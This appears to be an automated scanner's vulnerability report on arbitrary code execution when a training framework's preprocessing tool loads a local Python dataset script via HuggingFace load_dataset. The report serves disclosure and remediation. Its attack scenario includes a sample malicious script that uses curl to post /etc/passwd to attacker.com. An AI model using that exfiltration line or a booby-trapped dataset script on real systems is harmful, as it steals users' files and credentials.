# Vulnerability Report: Arbitrary Python Script Execution via load_dataset

## Vulnerability Metadata

| Field | Value |
|-------|-------|
| **ID** | VULN-tools-load_dataset-003 |
| **Type** | Python Script Execution (CWE-94) |
| **Severity** | High |
| **CWE** | CWE-94: Improper Control of Generation of Code ('Code Injection') |
| **Location** | tools/data_handler.py (lines 518-526) |
| **Function** | `build_dataset()` |
| **Entry Point** | tools/preprocess_data.py - main() |
| **Trust Level** | untrusted_local |

## Vulnerability Description

Local Python scripts passed via `--input` command-line argument are executed directly through HuggingFace's `load_dataset()` function without any validation or security measures. The `_has_py_script()` function only verifies the presence of a `.py` file extension but does not validate the script content, origin, or behavior. Malicious dataset generation scripts can execute arbitrary code during the dataset loading process.

## Affected Code

### Primary Vulnerable Function (tools/data_handler.py, lines 505-526)

```python
def build_dataset(args):
    """loading dataset by huggingface"""
    if args.handler_name == "MOSSInstructionHandler" or args.handler_name == "MOSSMultiTurnHandler":
        # for MOSS, streaming is needed.
        args.streaming = True
    if args.hf_datasets_params:
        with open(args.hf_datasets_params, 'r') as fin:
            param_dict = json.load(fin)
        return load_dataset(**param_dict)
    cache_dir = DEFAULT_CACHE_DIR
    split_flag = "train"
    load_from_local = os.path.exists(args.input)
    if load_from_local:
        if _has_py_script(args.input):                        # VULNERABLE: Only checks .py extension
            logger.info("loading data from a local python script")
            raw_datasets = load_dataset(                      # CODE EXECUTION: Script is executed
                args.input,
                split=split_flag,
                num_proc=None if args.streaming else args.workers,
                cache_dir=cache_dir,
                streaming=args.streaming
            )
```

### Inadequate Validation Function (tools/data_handler.py, lines 490-502)

```python
def _has_py_script(input_name):
    if os.path.isdir(input_name):
        dir_name = os.path.basename(input_name)
        if os.path.exists(os.path.join(input_name, dir_name + '.py')):
            has_py_script = True
        else:
            has_py_script = False
    else:
        if input_name.split('.')[-1] == 'py':                 # ONLY checks file extension
            has_py_script = True
        else:
            has_py_script = False
    return has_py_script
```

### Entry Point (tools/preprocess_data.py, lines 172-179)

```python
def main():
    args = get_args()

    tokenizer = build_tokenizer(args)
    splitter = build_splitter(args)

    logger.info("building dataset: %s", args.input)
    raw_data = build_dataset(args)                            # User input flows here
```

## Data Flow Analysis

```
argv (command line) 
    ↓ 
argparse.parse_args() 
    ↓ 
args.input (user-controlled path)
    ↓
os.path.exists(args.input)
    ↓
_has_py_script(args.input) → checks only .py extension
    ↓
load_dataset(args.input) → EXECUTES Python script
```

## Attack Scenario

1. **Attacker prepares malicious dataset generator**:
   ```python
   # malicious_dataset.py
   import os
   import subprocess
   
   # This file appears to be a normal HuggingFace dataset script
   # but contains backdoor code
   
   # Malicious code executes during import
   subprocess.run(['curl', 'http://attacker.com/exfil', '-d', open('/etc/passwd').read()])
   
   # Normal dataset interface (decoy)
   import datasets
   class MaliciousDataset(datasets.GeneratorBasedBuilder):
       def _split_generators(self, dl_manager):
           # ... normal-looking dataset code
   ```

2. **User downloads or receives the malicious script** from:
   - HuggingFace Hub (community dataset)
   - Shared network drive
   - Email attachment
   - Compromised repository

3. **User runs preprocessing tool**:
   ```bash
   python tools/preprocess_data.py \
       --input ./malicious_dataset.py \
       --tokenizer-type GPT2BPETokenizer \
       --output-prefix ./processed_data
   ```

4. **Arbitrary code executes** with user's privileges.

## Security Impact

| Impact Category | Severity | Description |
|-----------------|----------|-------------|
| **Remote Code Execution** | High | Attacker can execute arbitrary Python code |
| **Data Exfiltration** | High | Access to sensitive files, credentials, environment variables |
| **Lateral Movement** | Medium | Potential pivot point in larger attack chain |
| **Privilege Escalation** | Medium | If run in elevated context (unlikely but possible) |

## Comparison with Known Security Measures

### HuggingFace Datasets Security Model

HuggingFace's `load_dataset()` function is designed to execute dataset generation scripts. However:

1. **No trust_remote_code equivalent**: Unlike `AutoTokenizer.from_pretrained()` which has `trust_remote_code=False` by default in newer versions, `load_dataset()` with a local script path has no such protection.

2. **No security warning**: The code does not warn users that the input script will be executed.

3. **Project's own security note acknowledges partial risk**: The SECURITYNOTE.md (line 118) mentions:
   > "数据集可能包含敏感或不合法内容，导致合规问题。数据集中可能存在质量问题，如标签错误或数据偏差"
   
   But this only covers **data quality** issues, NOT **code execution** risks!

## Existing Mitigations

| Mitigation | Status | Evidence |
|------------|--------|----------|
| Content validation | ❌ Not implemented | `_has_py_script()` only checks extension |
| Script signature verification | ❌ Not implemented | No signature check present |
| Sandbox execution | ❌ Not implemented | Direct `load_dataset()` call |
| Security warning | ❌ Not implemented | No warning about script execution |
| Input sanitization | ❌ Not implemented | Path used directly |
| Allowlist/denylist | ❌ Not implemented | No path restrictions |

## Evidence from Codebase

### No Protection in tokenizer module (for comparison)

The tokenizer module implements `trust_remote_code=False`:
```python
# mindspeed/tokenizer/tokenizer.py (line 75)
hf_tokenizer_kwargs["trust_remote_code"] = False
```

But `load_dataset()` in data_handler.py has no equivalent protection.

## Recommended Remediation

### Priority 1: Add Security Warning

```python
def build_dataset(args):
    """loading dataset by huggingface"""
    # ...
    if load_from_local:
        if _has_py_script(args.input):
            logger.warning(
                "SECURITY WARNING: Loading dataset from Python script '%s'. "
                "This script will be EXECUTED. Only use scripts from trusted sources!",
                args.input
            )
            # Optionally prompt user for confirmation
            # if sys.stdin.isatty():
            #     response = input("Continue? [y/N]: ")
            #     if response.lower() != 'y':
            #         sys.exit(1)
```

### Priority 2: Implement Script Allowlist

```python
# Configuration for allowed dataset scripts
ALLOWED_DATASET_SCRIPTS = [
    # Add hash or path patterns for known-good scripts
]

def _validate_script_safety(script_path):
    """Validate that script is from a trusted source."""
    import hashlib
    
    # Calculate script hash
    with open(script_path, 'rb') as f:
        script_hash = hashlib.sha256(f.read()).hexdigest()
    
    # Check against allowlist
    if script_hash not in ALLOWED_DATASET_SCRIPTS:
        raise SecurityError(
            f"Dataset script {script_path} not in trusted allowlist. "
            f"Hash: {script_hash}"
        )
```

### Priority 3: Add Sandbox Option

```python
def build_dataset(args):
    # ...
    if _has_py_script(args.input):
        if args.sandbox_dataset_script:
            # Use restricted Python environment
            raw_datasets = _load_dataset_sandboxed(args.input, ...)
        else:
            logger.warning("Executing dataset script without sandbox...")
            raw_datasets = load_dataset(args.input, ...)
```

### Priority 4: Update Documentation

Add to SECURITYNOTE.md:
```markdown
### Dataset Script Execution Warning

当使用 `--input` 参数指定本地 Python 脚本作为数据集来源时，该脚本将被执行。
请确保：
1. 仅使用来自可信来源的数据集脚本
2. 在运行前检查脚本内容
3. 考虑使用非脚本数据格式（如 JSON, Parquet, CSV）
```

## References

- **CWE-94**: Improper Control of Generation of Code ('Code Injection') - https://cwe.mitre.org/data/definitions/94.html
- **HuggingFace Datasets Security**: https://huggingface.co/docs/datasets/security
- **Similar vulnerabilities in ML frameworks**: 
  - CVE-2025-32434 (PyTorch torch.load)
  - Model file code execution in various ML frameworks

## Additional Context

| Factor | Value |
|--------|-------|
| Attack complexity | Low |
| Privileges required | User execution context |
| User interaction | Required (user must run the tool) |
| Scope | Changed (can affect other processes/files) |
| Framework context | Internal training framework - trusted admin scenario expected |
| Real-world likelihood | Medium - depends on user downloading scripts from untrusted sources |

## Verification

To verify this vulnerability:

1. Create a test script that writes to a known location when executed:
   ```python
   # test_dataset.py
   open('/tmp/pwned.txt', 'w').write('Code executed!')
   raise SystemExit
   ```

2. Run:
   ```bash
   python tools/preprocess_data.py \
       --input ./test_dataset.py \
       --tokenizer-type GPT2BPETokenizer \
       --output-prefix ./test_output
   ```

3. Check if `/tmp/pwned.txt` was created (confirms code execution).

---

*Generated by security scanner on 2026-04-20*
